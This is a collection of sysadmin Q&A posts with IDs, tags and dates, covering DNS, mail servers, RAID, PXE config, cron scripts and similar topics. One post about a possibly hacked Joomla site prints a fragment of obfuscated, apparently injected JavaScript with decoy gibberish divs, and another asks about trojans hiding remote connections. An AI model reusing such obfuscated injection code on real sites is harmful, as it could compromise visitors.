995/tcp   open  pop3s
3306/tcp  open  mysql
20000/tcp open  dnp

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
[root@host ~]#
</code></pre>
","<smtp><port><firewalld>","2016-01-13 23:14:55"
"850912","Does a 32-bit Linux program's entire runtime lib tree need to be 32-bit?","<p>On my 64-bit RHEL machine, I'm compiling and running a C &amp; Fortran program that is 32-bit only.  It invokes the non-static version of a lot of standard Linux libs (X11, OpenGL/Mesa, Motif, etc...), which of course invoke other libs (libjpeg, libc, etc).  Do I have to install the 32-bit versions of that entire devl lib tree in order to build this program validly?  And do I have to install the 32-bit versions of that entire run-time lib tree in order to run it without it segfaulting or whatever?</p>
","<linux><32bit-64bit><libraries>","2017-05-18 14:10:09"
"1048167","Can I build public cloud using bare metal servers?","<p>Can I build a public cloud using bare metal servers, hypervisor? If not, what is the procedure to become a public cloud provider in the most cost-effective method ?</p>
","<cloud><cloud-computing><bare-metal>","2020-12-31 14:32:35"
"749240","how to pipe the output of a command (let's say ipconfig) in another cmd window?","<p>""Commands that provide a lot of information should be run in a separate command shell with output piped through a pager (the “more” command), and with an appropriate title on the second command window.  "" This is what i am supposed to do.</p>
","<windows-command-prompt>","2016-01-14 22:37:30"
"1048184","Upload website in a rented cloud server","<p>I have access to a cloud server by IONOS. My domain has been connected to this server. Now the next step is to create a website and upload it. I have no experience in doing that. I use FileZilla to connect on the server and transfer the files. But I have no idea where I should save the html files etc. Any help would be really appreciated. Thank you in advance and happy new year.</p>
","<domain><hosting><website><upload><html>","2020-12-31 16:13:14"
"749294","3ware 9650se not recognizing SAS drives, what else should I check?","<p>The card works fine with SATA Raptors but can't see 2 different models of Cheetah. Drives are fine and have standard fw - visible with LSI 3081ER. </p>
","<hardware-raid><sas><3ware>","2016-01-15 06:31:10"
"749462","Is there a way to point many domain names to the same IP without repeating the IP","<p>I own about 100 domain names. Most of them are unused, but I have them all set up to point to the same server so that I can serve a redirect to my main domain name.</p>

<p>Right now, I'm using A records for each domain to point to my server. I'm about to change servers, which means I'll need to change IPs. Using Google Cloud DNS (or any DNS provider), is there a way to use some sort of root CNAME or variable so that I don't have to change the IP 100 times?</p>

<p>I'd love to be able to update a single domain's A record, and then see the rest update automatically, but I don't see a way to make a CNAME record on a non-subdomain, only an A record.</p>
","<domain-name-system><google-cloud-platform>","2016-01-15 17:46:54"
"749688","if you have your entire infra on Amazon VPC, what kind of uptime guarantee is a safe committment?","<p>We are a small startup trying to cater to our first customer. At the moment, the entire h/w setup is on amazon cloud (will be moving shortly to VPC). I have to give an estimate to the customer, on what kind of uptime guarantee my company can offer. While Amazon offers Less than ""99.95% but equal to or greater than 99.0%"", I think it would make sense to factor in my application upgrades, patching and other maintenance activity on my side and go with a much lesser estimate, say 95%. </p>

<p>I think my question is more in a general sense as to what is a safer commitment for a startup dealing with its first client, in terms of SLA. Would something like 90-95% sound acceptable to for my customer (which is a billion dollar company and they pay us per transaction), consdering that we are not a mature company in this space? </p>
","<amazon-ec2><amazon-web-services><amazon-vpc><uptime>","2016-01-17 05:13:22"
"749695","Point multiple ips to one server","<p>I'm trying to setup a squid proxy on an ubuntu server. I happen to have multiple ip addresses that I bought along with the vps. Is it possible for me to setup the 2 extra ip addresses to point to my ubuntu vps so that I can have multiple proxy ips?</p>
","<networking><proxy><ip><squid>","2016-01-17 06:17:37"
"749783","Disable/remove Let's Encrypt?","<p>I followed this tutorial to enable Let's Encrypt on my server, however I now want to remove/disable it:</p>

<p><a href=""https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-14-04"" rel=""nofollow noreferrer"">https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-14-04</a></p>

<p>How can I do this?</p>
","<ubuntu><ssl><https><ubuntu-14.04><lets-encrypt>","2016-01-17 20:00:47"
"749962","Godaddy hosted domain vs paid domain","<p>This is probably going to get downvoted into oblivion, but here it goes.  The company I work for has a deluxe hosting plan on Godaddy.  They have a hand full of domains registered under the same hosting account (for different product lines).  When I expand the ""domains"" tab, I can see only these few domains.  However under the hosing tab there is ""9 Hosted domains""  Many of which I recognize as belonging to my boss' brother for his company.</p>

<p>All of the domains work perfectly fine.  </p>

<p>I found this artice from godaddy : <a href=""https://ca.godaddy.com/help/add-domains-8342"" rel=""nofollow noreferrer"">https://ca.godaddy.com/help/add-domains-8342</a></p>

<p>So, am I to understand that I can just add domains as I please for free? And if so, why would anyone bother paying for a second or third domain?  Is there some fundamental difference between a ""hosted domain"" and one I would have to pay for yearly?</p>
","<hosting><godaddy><domains>","2016-01-18 16:14:57"
"749967","init / inittab respawn (count number of times it occurs)","<p>I added the following line in my /etc/inittab to respawn a program if it crashes.</p>

<pre><code>#test must always run.
aa:2345:respawn:/home/pi/test/test
</code></pre>

<p>Is there a way to know how many times the init/respawn event occurs ?
Is there a log file for inittab ?</p>

<p>I'm using Raspbian Wheezy and Ubuntu 14.04.</p>
","<linux><ubuntu-14.04><process><init><inittab>","2016-01-18 16:37:05"
"925507","Fail2ban only works with log files?","<p>What about Unix sockets? I have created my own server application that needs protection.</p>

<p>My two options:</p>

<ul>
<li>Creating a log file for fail2ban to watch</li>
<li>Establish networking between my server application and fail2ban (Unix sockets)</li>
</ul>
","<fail2ban><ipc>","2018-08-08 17:13:48"
"925562","linux port forwarding between two nics","<p>I have a vicidial server running on suse. I have installed two nic cards. One nic connects to my local network and the other connects to the firewall. The config is as below:
Nic 1 : 192.168.2.21 (local network)
Nic 2 : 172.31.31.21 (to firewall NATed)
I want to route all SIP calls from Nic 1 to Nic 2 which ultimately will route calls to my SIP provider. I will need internet on both the nics. Nic 1 will need internet for yum updates and Nic 2 will need internet to register the SIP provider.
Right now all SIP calls are being route out through Nic 1. How do I route it through Nic 2? I am new to iptables, can iptables help?</p>
","<iptables><port><nic><forwarding><sip>","2018-08-09 04:16:30"
"750184","Best load balance hardware","<p>I have to buy a load balance to manage two adsl lines (ADSL 2), on a company with a huge number of users.
This device will have at least 3 wan port (for a new future adsl line), and gigabit lan. </p>

<p>Which load balance hardware can I buy for my purpose?  </p>

<p>I have seen tp-link TL-ER5120, but I'm not sure it is able to manage all the traffic of my network.</p>
","<networking><load-balance>","2016-01-19 13:35:30"
"750273","Sync two Non-Enterprise SQL Servers","<p>We have a SQL Server 2005 in one of our company's locations. </p>

<p>Since DB calls from other locations are very slow, we would like to set up another SQL Server on the other location and keep the server databases in synch. So a user can make DB calls from either systems and get the same results. Same with changes to the data.</p>

<p>We can (and probably should) update to a newer version of SQL Server. But we would like to avoid using the expensive Enterprise Version of SQL Server.</p>

<p>What mechanism could we use to set that up cheap and simple?</p>
","<sql-server><replication><synchronization>","2016-01-19 18:17:23"
"925992","Had cat5e cable and got 1000mbps, upgraded segment of it to cat6, now limited to 100mbps","<p>I have a setup in my home that goes something like this:</p>

<p>[cable modem] -> [Netgear Gigabit switch UPSTAIRS] -> [Netgear Gigabit Switch DOWNSTAIRS] -> [Netgear Gigabit Switch OFFICE] -> [My PC]</p>

<p>Now, I previously had cat5e throughout the place, and routinely got close to 1000mbps over the network and coming in (I have a gigabit connection).</p>

<p>However, today - I replaced the trunk of line between the UPSTAIRS switch and DOWNSTAIRS switch with Cat6 cable.</p>

<p>My internet still works, with a few oddities:</p>

<p># The link indicator on the switches (Upstairs and Downstairs) both read that they have a 100mbps connection, not 1000mbps like they did before
  # Obviously, speedtests on my PC indicate that I am limited to ~95mbps, not the 800+ I was getting before
  # My network indicator in my systray on windows has the yellow exclamation mark. When I click on the adapter properties, it says no internet, despite the fact I am on the internet right now writing this.</p>

<p>I have no idea what is going on, or why this is even happening. Can anyone help me shed some light? I want to reiterate that only one section of cabling has been replaced with Cat6, the rest is still cat5e.</p>

<p>Thanks!</p>
","<networking><switch><gigabit-ethernet><cat5e><cat6>","2018-08-12 00:39:14"
"750483","Adding https in URL takes to different site","<p>I have a domain www.abc.co.in mapped with default index page. but, when i add <code>https</code> in the url to <a href=""https://www.abc.co.in"" rel=""nofollow noreferrer"">https://www.abc.co.in</a>, it takes to someone else's site. Does it have to be any configuration problem in DNS mapping? Please let me know your views</p>
","<website><dns-hosting>","2016-01-20 13:38:35"
"926035","USB Modem soft reinitialization","<p>I'm using an USB 3G/4G modem to access the Internet (connection with <code>wvdial</code>) but also to query my account usage,  recharge and buy data offers with <code>AT</code> commands on the serial ports. Sometimes the modem just hangs and none of the <code>/dev/ttyUSB0-3</code> respond. The only way to re-initialize the modem is to physically remove it and re-insert it in the USB port. </p>

<p>I'm wondering if there is a way to do the same initialization by software so that I would be able to include this in a recovery script.</p>

<p>I'm running on Ubuntu 16.04, 18.04 and Ransperian stretch and the modems I tested are from Qualcom and Huawei.</p>
","<ubuntu><modem><raspbian><gsm>","2018-08-12 13:10:55"
"926063","Is it dangerous to use dummy packages in Linux?","<p><strong>Is it can be</strong> dangerous to use dummy packages in Linux ? For example : I use Mate. By installing app from repo, it gives me information like :</p>

<blockquote>
  <p>You app needs this : libgconf2-4 - GNOME configuration database system
  (dummy package)</p>
</blockquote>
","<linux><repository>","2018-08-12 21:00:59"
"750540","Use Google Drive for live DB backup?","<p>I am currently trying to define my backup strategy for my AWS EC2 server. I already use Google Drive to backup my apache root folder. This also automatically doubles as a deployment strategy since the drive folder is linked to my local repo on my home PC.</p>

<p>I was wondering if I could also include the database data directory and have it synced with Google Drive? Or should I rather stick with conventional SQL dumps for backup?</p>
","<backup><database><google-drive>","2016-01-20 18:10:21"
"926109","How do I reconnect my Amazon RDS database to my EC2 instance after restarting?","<p>I'm running a staging site through an EC2 instance which I stopped earlier tonight, without being aware that Amazon would give me a new IP address.</p>

<p>I've already edited all my database info in my site files with the new IP info and pushed them live. I'm certain that everything is correct. The site is showing up at the proper IP address too.</p>

<p>But I'm getting a ""Unable to connect to database server. Please refresh in a few seconds."" This would make me think that the database credentials were wrong, but I've double and triple checked them, and it turns out that the old database credentials are not working when I input them into Adminer (v4.3.1 in case it's important). It's like the database itself simply disappeared when I reset the server.</p>

<p>I happen to have a backup copy of the database on my laptop, so I can restore a new one in case AWS did somehow manage to delete it.</p>

<p>Can anyone clue me into what might be going on and how I might fix it? Thanks!</p>
","<mysql><amazon-web-services>","2018-08-13 07:42:12"
"750577","Without using mod_rewrite, what is the best way to redirect all subdomains to https?","<p>I am currently using mod_rewrite to redirect all subdomains to https, but multiple sources have suggested that </p>

<blockquote>
  <p>Using mod_rewrite to do this isn't the recommended behavior. See
  <a href=""https://wiki.apache.org/httpd/RewriteHTTPToHTTPS"" rel=""nofollow noreferrer"">RedirectSSL</a></p>
</blockquote>

<p>The <a href=""https://httpd.apache.org/docs/2.2/rewrite/avoid.html"" rel=""nofollow noreferrer"">apache docs</a> suggest Redirect and RedirectMatch:</p>

<blockquote>
  <p>A common use for RewriteRule is to redirect an entire class of URLs.
  For example, all URLs in the /one directory must be redirected to
  <a href=""http://one.example.com/"" rel=""nofollow noreferrer"">http://one.example.com/</a>, or perhaps all http requests must be
  redirected to https.</p>
  
  <p>These situations are better handled by the Redirect directive.
  Remember that Redirect preserves path information. That is to say, a
  redirect for a URL /one will also redirect all URLs under that, such
  as /one/two.html and /one/three/four.html.</p>
</blockquote>

<p>Unfortunately, both of these documents (and anything else I have found) are only considering matching a single domain, rather than all subdomains. RedirectMatch seems like a good candidate for a relatively simple task like this, but I can't seem to get ""http"" to match as I expect:</p>

<pre><code>RedirectMatch permanent ""^http://(.*)$"" ""https://$1""
</code></pre>

<p>My guess as to why that doesn't work is because the redirectMatch is looking for a path and not a URI, but at this point I am stuck. Is it possible to accomplish a redirect of all subdomains to https without mod_rewrite, or is that the best available method?</p>
","<ssl><apache-2.4><mod-rewrite>","2016-01-20 19:59:43"
"750607","Cannot connect to smtp mail server","<p>I have an installation of Postfix &amp; Dovecot on a Centos 7 server. While being logged into the server via ssh I am able to use telnet and openssl to connect to localhost like</p>

<pre><code>openssl s_client -starttls smtp -crlf -connect localhost:25
</code></pre>

<p>authenticate myself, and send an email. However, when I try to connect to the server from my local Computer, replacing localhost with the server name, I get the error message</p>

<pre><code>connect: Connection refused
connect:errno=61
</code></pre>

<p>Using telnet I get the error</p>

<pre><code>Trying XXX.XXX.XXX.XXX...
telnet: connect to address XXX.XXX.XXX.XXX: Connection refused
telnet: Unable to connect to remote host
</code></pre>

<p>The file <code>/etc/postfix/master.cf</code>contains the lines</p>

<pre><code>smtp      inet  n   -   n   -   -   smtpd
submission inet n   -   -   -   -   smtpd
</code></pre>

<p>The command <code>netstat -tpnl | grep :25</code> results in</p>

<pre><code>tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      10327/master        
tcp6       0      0 :::25                   :::*                    LISTEN      10327/master 
</code></pre>

<p>Calling <code>systemctl status iptables.service</code> on the server yields</p>

<pre><code>● iptables.service
Loaded: not-found (Reason: No such file or directory)
Active: inactive (dead)
</code></pre>

<p>Entering my mail server at mrtoolbox.com results in the message</p>

<pre><code>Connecting to XXX.XXX.XXX.XXX
1/20/2016 3:43:42 PM Connection attempt #1 - Unable to connect after 15 seconds. [15.01 sec]

PWS3v2 15193ms
</code></pre>

<p>Can you give me some hints what I might have missed or how to check what is going wrong, here?</p>
","<centos><smtp><openssl><telnet>","2016-01-20 22:04:06"
"750658","#raidctl - Operation not support with volume of this level","<p>I am having problem to create a RAID volume on the internal disks of a Sun Server (Sunf Fire V440)</p>

<p>When I type the below command<br>
<code>raidctl -f -c -r 5 c1t0d0 c1t1d0 c1t2d0 c1t3d0</code>
<br> it displays<br><code>Operation not support with volume of this level.</code><br>
<br>My controller is ""LSI_1030""<br>
<br> Help me out please</p>
","<raid><freebsd><solaris><lsi><sun>","2016-01-21 04:11:50"
"750670","mapping a new domain name to existing IP","<p>I have a java application hosted in aws as an ec2 instance with a hosted zone and record sets for NS and SOA and it works fine. </p>

<p>I access the application using a url which looks like <a href=""https://xxx.xxx.xxx.xxx:xxxx/----"" rel=""nofollow noreferrer"">https://xxx.xxx.xxx.xxx:xxxx/----</a></p>

<p>I have a registered domain name and I want to map the domain name to the above address. I tried creating A record but the name is not being resolved. It gives me the error 'Server not Found'.</p>

<p>How do I assign my domain name to point to my existing IP.?</p>
","<amazon-ec2>","2016-01-21 06:45:02"
"750692","Joomla site hacked?","<p>I have a doubt abount a joomla 2.5.6 site. Once in a while I notice some stranged crypted code in the page HTML source. Something like this:</p>

<pre><code>&lt;div id=""bwjolqpgqnqho"" class=""vhdpqfdouxwsm""&gt;b kb q bxdb bjdfar, cccw da dkbd arbhcsb mbzcl bmct bpdjas e lbuasa mawdoexcuaf cdc. l axagbqdjc ze scwdk dkcrcq eudcdee qere p cre ia ydgdv dmcpdd cu dgbyaj abbnbmbm - abbz b cagcia 'faya' rawd g edcscm ac a - datbwaue pc caa. bjciccb, s. bk beccd rdye. ve kdg dzcoae. bnac dadjcudgbz - b easchcf b mb cesaqdac, d alahbdd paacfbz ccar aycdbd budoac et cpcudkax bb cba t, a pcdbl cdc nbk dpakcea dawdk d adgemcfbyb abbbccia, c dtccbablcj; bnbjciagdndcdw eq eqdbcddfarch. d jd, ocpdfarbuaw a lb g b u bwd edxa z abb ybe awd, iahbbadbybhabclbxagbpdhc zesdda xaxa qabchadambmdxcabdb ucs aaet czdbal, ah an; cgad doeu bj cfabbk d la gcbb 35 cb aavavawb kbcaz bib kbwagb zdn akcjdcasb aaabbc gataw. cdeicdaacdaicuecdoc waial dbbhapagbmbj e r doepaca vb rddbbbdbaatcka sd kdtetelbf clajayehcr aaam akaybzdkdqc cb icbdbbkdqa ebgazda dmbbaoce afajbx btc ba. gbqdga hbhaqddcsdbbdbwaua dclbudvb ccbd ddkejacaham a. ddaerc vaucdb ncc bbbvc taj clad asb! b. aqbbchalanc cbubm bcebcoambyaebcba, b faqbxcuabcj. bme. ean, bodfaxcdaz doaobaar bhasanbibib. g cnc ddmaveebe, d adbdpd ebwd nafdyevbmdle wc taub rdrcta wa kczbvdhdeec - evesdme la b dedx dpctdmdfadcla cawcgeodtd pekacctela cawaraub cbidncmdsewe lc zerao cw, c gamabazbe areadm, cz ccbic bdddsbbdq&lt;/div&gt;
&lt;div id=""ixoxvsjxrhw"" class=""vhdpqfdouxwsm""&gt;RKCoG2eSjsxstVfb&lt;/div&gt;
&lt;script&gt;
var dstyivgcdrqqdx=(1929296112&gt;2050752883?""\x6b\x77"":""\x72\x76"");
var nmhccirwiihn=(104472961&lt;11000854?""\x65\x74"":""re"");
var lisknlunhmqet=(1186652785&lt;445269550?""\x77\x64"":""r"");
nmhccirwiihn+=(531284007+653848334&gt;327931464?""\x74\x75\x72\x6e"":""h"");
var zrjtzvapxzu=(14463650+610071539&gt;61219278?""\x72\x65\x74\x75"":""h"");
var aszmusumizwozpig=(426160674+1361381336&lt;387797917+1566709949?""\x72\x65"":""jxt"");
var izpemkvqmmobs=(950083231&gt;1227876977?""\x70\x66"":""i"");
dstyivgcdrqqdx+=(493011132&lt;452720027?""\x79\x7a"":""\x3a\x31\x31"");
nmhccirwiihn+=(794042046+1118740131&gt;1233259606?""\x20"":""d"");
var bsgwqjlfbyrqlp=(2035779590&lt;1136018259?""aq"":""ret"");
var sfqcsmbjevzhln=(312554261+65106612&lt;187058867+677910351?""\x72"":""\x72\x7a\x77"");
var utwwjrxktzrx=(114217555+1954790718&gt;894395565?""[]"":""\x6f\x6b"");
var iolbbxrrjeidgrp=(303028237+550171059&lt;514432896+821377708?""\x72"":""\x74"");
iolbbxrrjeidgrp+=(499985427&gt;889587822?""nok"":""\x65\x74\x75\x72\x6e"");
var kqmuuyelqyxqfz=(1527911828+613124032&lt;663145577+1481136903?""f"":""p"");
utwwjrxktzrx+=(1536082584&gt;1934435039?""xh"":""\x5b\x75\x79"");
var tzrjfsqughnav=(796279552+607718112&gt;17600193?""\x72"":""mj"");
kqmuuyelqyxqfz+=(1697844671+167811137&lt;1412837828+546852759?""\x75"":""\x76\x65"");
utwwjrxktzrx+=(60945469&gt;1170273576?""w"":""\x75\x6f"");
zrjtzvapxzu+=(1251932751+160236872&lt;947197532+500098101?""rn"":""us"");
kqmuuyelqyxqfz+=(1710202476+289532444&lt;928257733+1147619777?""n"":""\x7a\x77"");
var idxxspyqjdhtws=(1205489743+143021423&lt;964968493+774463552?""ret"":""\x6f\x65\x66"");
var ixoxvsjxrhw=(503914128+831334202&gt;754056605?""\x69\x78\x6f"":""gi"");
tzrjfsqughnav+=(175195049+91195650&gt;199815031?""\x65\x74"":""rk"");
idxxspyqjdhtws+=(998203113&gt;1543504395?""\x73\x71"":""u"");
aszmusumizwozpig+=(1183542335+117680842&lt;615936676+1097840178?""\x74\x75\x72\x6e"":""\x70\x72"");
iolbbxrrjeidgrp+=(1417804280&lt;956308750?""ser"":"" "");
nmhccirwiihn+=(1275596373+304125062&lt;938435994+1190623659?""i"":""s"");
var rcnaswwbdim=(1604120453&lt;1554370323?""\x66\x73"":""\x72\x65\x74"");
var lvjbjpqohpl=(109054309+35702381&lt;263995810+676605071?""\x72"":""f"");
utwwjrxktzrx+=(995689741&gt;2028647691?""st"":""w"");

var muflxttvhbex=[dstyivgcdrqqdx, aplkenurwllomp,];
for (zjbwmhyuoepma=thrxwuwdiaqq; edrpvfucpe(zjbwmhyuoepma,ctjtpxekjsbrnt(muflxttvhbex)); zjbwmhyuoepma++)
{
    if (edrpvfucpe((+[window.sidebar]),bjscvqbtkrcf(utcexmovlgf(zjbwmhyuoepma),muflxttvhbex[zjbwmhyuoepma])))
    {
        wenqrusckvqv=tmwjgjdehfebi(ctjtpxekjsbrnt(muflxttvhbex), zjbwmhyuoepma);
        break;
    }
}&lt;/script&gt;
&lt;div class=""vhdpqfdouxwsm""&gt;by cvekdycuc ceicqendacwcvczdzdwdlcdes dkdvcxeld xcfc; yepea. eg csd k cbd veccw, d wcyeocqebdd cyeb cvb zcobzd kdfcadgdud. ye hep dyc tedcve jdte sdx crejcz. e acudjdldxdbd bcecpepb xby, czcsdycdcact cpc edvdfdacod vcr e. b d a by coeoeac ocpe kcacrehcoc sefepe qb yc pes&lt;/div&gt;
&lt;script&gt;
for (zjbwmhyuoepma=thrxwuwdiaqq; edrpvfucpe(zjbwmhyuoepma, ctjtpxekjsbrnt(bicxcttzqmg)); zjbwmhyuoepma=wybnybknfgac(zjbwmhyuoepma, xbvdbcshcctsgdxd))
{
    var ysmxkecizsyq=yvmzahgdgrtno(bicxcttzqmg, zjbwmhyuoepma);
    if (wettklooonrumf(dtjvvrebndhszo(46*wenqrusckvqv + 5, ysmxkecizsyq), dtjvvrebndhszo(ysmxkecizsyq, 52*wenqrusckvqv + 18)))
    {
        if (vynawhmpavrzx(ifajvnijackoa, wenqrusckvqv))
        {
            lcxnvxkmfihz=wybnybknfgac(lcxnvxkmfihz, myrttyhlwgbhon(vynawhmpavrzx((mvdcltcvebpo(wybnybknfgac(nlzjcpleylbraq, tmwjgjdehfebi(ysmxkecizsyq, 46*wenqrusckvqv + 5)), yvmzahgdgrtno(wfnqmuukgcio, vynawhmpavrzx(lrrmwfxzyrc, ctjtpxekjsbrnt(wfnqmuukgcio))))), 94*wenqrusckvqv + 67)));
            lrrmwfxzyrc=wybnybknfgac(lrrmwfxzyrc, xbvdbcshcctsgdxd);
        }
        else
        {
            nlzjcpleylbraq=ziesauzqqjdi(12*wenqrusckvqv + 2, tmwjgjdehfebi(ysmxkecizsyq, 46*wenqrusckvqv + 5));
        }
        ifajvnijackoa=wybnybknfgac(ifajvnijackoa, xbvdbcshcctsgdxd);
    }
}
</code></pre>

<p>I don't know if this a legit code generated from some module or the result of a hack.</p>
","<joomla>","2016-01-21 08:23:10"
"750729","Nagios alert by email for WARNING","<p>I want to set Nagios up to issue warnings (e.g. mildly high disk usage of clients) via email. I'm new to nagios core, so please assist me to achieve this. what changes I have to make in config files like <code>contacts.cfg</code>, <code>services.cfg</code>, <code>commands.cfg</code> and things to be added at client etc. I'm newbie to nagios. After so much of googling out I didn't find suitable info anywhere, So asking here to guide me properly. or anyone can provide link to follow that. any help would be appreciated.</p>
","<nagios><disk-space-utilization><warning>","2016-01-21 10:37:36"
"926315","I removed libc6 and now server is broken","<p>I removed libc6 and now server is broken.</p>

<p>Now no commands work. ls, df nothing but I'm still connected to it on the ssh session. Any help?</p>
","<linux><ubuntu>","2018-08-14 11:41:42"
"750771","Can not obtain ownership information","<p>IIS was running on port 80. I created Self Signed Certificates and did the binding for the resources hosted on the server, enabling port 443 for HTTPS. Then later on I had to remove to bindings, as well as the certificates. And disable 443. And now what I find is the even after restarting the web server, it's not really starting.
It is showing as successfully started, but that's not really working.</p>

<p>When I checked the o/p of <strong>netstat -abno</strong></p>

<p>I got the information ""<strong>Can not obtain ownership information</strong>"".</p>

<p>I googled for the same. But the results are not satisfying, and I am not really finding any fix for the issue.</p>

<p>Please help. #TIA</p>
","<iis-7><windows-server-2012-r2>","2016-01-21 13:58:04"
"750773","Windows Server vs Ubuntu base CPU usage for AWS EC2 burstable instances","<p>I recently switched from a small VPS provider to AWS EC2. My traffic usually comes in bursts throughout the day and I therefore concluded that running multiple t2.micro instances would be by far the most economical solution.</p>

<p>For those who don't know about it: micro instances are very cheap and you get 10% baseline usage of 1 CPU core. However, you are allowed to use up to 100% for short bursts if your average use stays below those 10%.</p>

<p>It is therefore much cheaper to run 10 micro instances (0.15$/hr) with potentially up to 10 cores running full load simultaneously for short bursts, than having some similar performance with one large instance (e.g. m4.2xlarge - 0.57$/hr)</p>

<p>The only disadvantage of the micro instances is that they would have to run 10x the base usage for the OS compared to a single large instance.</p>

<p>I currently use Windows Server which already uses a good chunk of the 10% allowed CPU usage. How does ubuntu compare to that? Is it much lighter (esp. without GUI) and would leave more of the performance for the actual hosting tasks?</p>
","<ubuntu><amazon-ec2><amazon-web-services><windows-server-2012><cpu-usage>","2016-01-21 14:04:37"
"750797","Can I remove a directory “Cancer ” and leave all other sub directories intact for directory “/home/John/Cancer/MillionDollars”?. Bash / Linux","<p>Get rid of  directory “Cancer” but keep directory “Million Dollars”</p>

<pre><code>           Directory:   /home/John/Cancer/MillionDollars 
   Desired Directory:  /home/John/MillionDollars
</code></pre>

<p>This is for later versions of Linux  </p>

<p>Thank you 
Timfox123</p>
","<linux><bash><redhat>","2016-01-21 15:07:26"
"750809","Can a remote connetion from outside a LAN be invisible to protocol analyzers such as Wireshark, Process Hacker, Nbtstat?","<p>When studying the behavior of trojans and (RAT) Remote Access Trojans this question came up. </p>

<p>Can an attacker create a trojan that could trick the OS or the NIC into hiding a remote connection to a computer so tools like <strong>Wireshark</strong> or <strong>Process hacker</strong> that can look at things such as active, listening, established connection wouldn't be able to see a remote connection to it so the attacker could make something like an invisible backdoor? </p>

<p>I know one way of accomplishing ""invisibility"" would be to encrypt a connection with IPsec so the whole packet payload+header would ""hide"" its identity even though a router would still know where it came from, I would like to know if is it possible to make a established connection ""invisible"" to Wireshark analysis.</p>
","<remote-access><encryption><wireshark>","2016-01-21 15:37:28"
"750824","Is it possible to ""sudo su"" using ssh in bash?","<pre><code>#!/bin/bash
USERNAME=ksmith
HOSTS=""linux1""
YUPDATE=""sudo yum -y update""
FIXDATE=""sudo -u echo -e 'ZONE=""America/New_York""\nUTC=true' &gt; /etc/sysconfig/clock""

for HOSTNAME in ${HOSTS} ; do
ssh -tt -l ${USERNAME} ${HOSTNAME} ""${YUPDATE}; ${FIXDATE}""

done
</code></pre>

<p>I get the error:</p>

<pre><code>sudo -u echo -e 'ZONE=""America/New_York""\nUTC=true' &gt; /etc/sysconfig/clock
-bash: /etc/sysconfig/clock: Permission denied
</code></pre>

<p>I manually went in and tried a sudo and it won't take. It requires a sudo su first, then it works. But I can't get it working in bash. I understand Fab / Python can do this, but I'm hoping to keep this in bash.</p>

<p>It's going to be a script that updates all our servers and then applies the ""FIXDATE"" fix(which requires sudo su). The yum update works fine.</p>
","<ssh><bash><sudo><su>","2016-01-21 16:44:01"
"926429","systemctl status dovecot.service, it floods console with all logs, how to stop","<p>systemctl status dovecot.service, it floods console with all logs, how to stop it?
on my cpanel server, it is running through tailwatchd, and it eats up too much cpu, whenever it runs. </p>

<p>how to disable log output in service status?</p>
","<linux><logging><systemctl>","2018-08-15 02:26:28"
"750916","Setting up STP network to isolate traffic from router?","<p>So I've been the self taught IT guy in my household for quite some time. I have a household with incredibly high traffic. 4-6 people connected simultaneously. Gaming, home theater network, video streaming, skype and other voice chat use, printer sharing, network file sharing and even outward game streaming.</p>

<p>We've been having an excessive amount of trouble with systems falling out of sync from the network and being unable to communicate with the rest of the network, LAN transfer rates completely destroying online speeds and vice versa. I need to do a redesign for my houses network most definitely.</p>

<p>I've been doing research and it seems the best course of action is to try to keep internal network traffic somewhat isolated from outbound network traffic.</p>

<p><a href=""https://i.sstatic.net/aoorA.jpg"" rel=""nofollow noreferrer"">This is the network that I've mapped out for my 3 story house.</a></p>

<p>What I want this to accomplish is that local traffic can jump between the floors and go directly to other locally connected systems. Then any traffic that needs to go into the internet goes directly through its switch to the router which only needs to handle internet traffic.</p>

<p>Will this layout work with an STP network?</p>

<p>Hypothetically will it reduce congestion in the network?</p>

<p>Are there any things I'm missing in this concept that will prevent this overall idea from being do-able?</p>

<p>I'm looking into using <a href=""http://www.amazon.ca/Cisco-SG200-08-Ethernet-Switch-1000Base-T/dp/B00IWIWTZG/ref=sr_1_1?s=pc&amp;ie=UTF8&amp;qid=1453415837&amp;sr=1-1&amp;keywords=Cisco%20200"" rel=""nofollow noreferrer"" title=""Cisco SG200-08"">Cisco SG200-08</a> switches and have not yet determined what router to use.</p>

<p>Would it be better to use a small business wireless router or a wired router with hot spots? <em>(one on top and bottom floor?)</em></p>

<p>And lastly, a non essential question to be answered: Are there any small tweaks that I can add to this design to have better features/functionality in regards to small business, server or home theater setups?</p>
","<networking><small-business><stp><media-server>","2016-01-21 23:10:55"
"975677","Cron Script running multiple times","<p>We have a script that is used to sync some directories to a USB disk drive. It is set to run once a day but often takes longer than that. </p>

<p>To ensure that multiple copies of the script don't run at the same time, we check the list of processes and if our script is present, we immediately exit.</p>

<pre><code>#!/bin/bash

#check if we are already running
running=$(ps aux | /usr/bin/grep -i ""usb_sync"" | /usr/bin/grep -v grep | /usr/bin/grep -c bash)
echo ""usb_sync $running"" &gt;/opt/local/backup/usb_sync_log
#If we are, the quit
if [ $running -gt 1 ] ; then
  exit 0
fi
</code></pre>

<p>The problem is that this check works fine when running it via sudo and manual invocation through the CLI. However when it is run through cron, it will start regardless. I have tried a couple of different variations but they all seem to run.</p>

<p>This is on FreeNAS 11.2.</p>
","<cron><scripting><truenas>","2019-07-17 23:27:32"
"750944","Understanding pxe config?","<pre><code>label DB
  kernel vmlinuz
  append initrd=initrd-6.2.img ramdisk_size=4196000 ip=dhcp ks=http://bmd/BaseServer/nua-6.cfg ksdevice=link text nofb biosdevname=0
</code></pre>

<p>I am trying to understand how to interpret the pxe config.</p>

<ol>
<li>What does kernel vmlinuz mean ?</li>
</ol>

<p>Does it mean to pull the kernel called vmlinuz from the tftp server ?</p>

<ol start=""2"">
<li><p>What does <code>append</code> mean ?</p></li>
<li><p>What is <code>ksdevice</code>?</p></li>
<li><p>What is <code>nofb</code> ?</p></li>
<li><p>What is <code>biosdevname</code> ?</p></li>
</ol>
","<pxe-boot>","2016-01-22 02:42:40"
"926698","Does a Galera equivalent for Postgres exist?","<p>I've been working with Galera for a number of months and like the failover along with the redundancy. I've got a Postgres DB that is in testing and will probably move to production. Is there a Galera equivalent for Postgres?  I read about ""standby"" DBs for Postrgres but not sure they are the same thing as Galera with regards to automatic failover/VIP.</p>
","<postgresql><database><galera>","2018-08-16 13:28:12"
"751051","Can we use a ADSL2+ modem in bridged mode to convert to ethernet WAN?","<p>I am no networking master, so I have no clue if this makes sense. </p>

